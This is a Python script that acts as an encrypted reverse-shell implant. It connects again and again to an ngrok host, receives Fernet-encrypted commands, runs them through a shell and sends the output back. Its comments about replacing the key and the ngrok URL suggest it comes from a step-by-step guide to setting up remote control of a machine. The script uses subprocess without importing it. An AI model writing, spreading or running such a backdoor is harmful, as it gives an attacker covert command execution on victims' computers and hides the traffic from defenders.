import socket
import time
from cryptography.fernet import Fernet

# REPLACE WITH YOUR KEY FROM STEP 3
KEY = b'9NwSfijmfS35Y9LLkjAh8o8XG5ehc5XZiL4t-IEfPMQ='
cipher = Fernet(KEY)

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("overbusy-milissa-perspiratory.ngrok-free.dev", 443))  # REPLACE WITH YOUR NGROK URL
            return s
        except:
            time.sleep(5)

def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

def main():
    while True:
        s = connect_to_server()
        
        while True:
            try:
                s.send(cipher.encrypt(b"ping"))
                
                encrypted_cmd = s.recv(4096)
                if not encrypted_cmd:
                    break
                
                cmd = cipher.decrypt(encrypted_cmd).decode()
                result = run_command(cmd)
                
                s.send(cipher.encrypt(result.encode()))
                
                time.sleep(1)
            except:
                break
        
        time.sleep(5)

if __name__ == "__main__":
    main()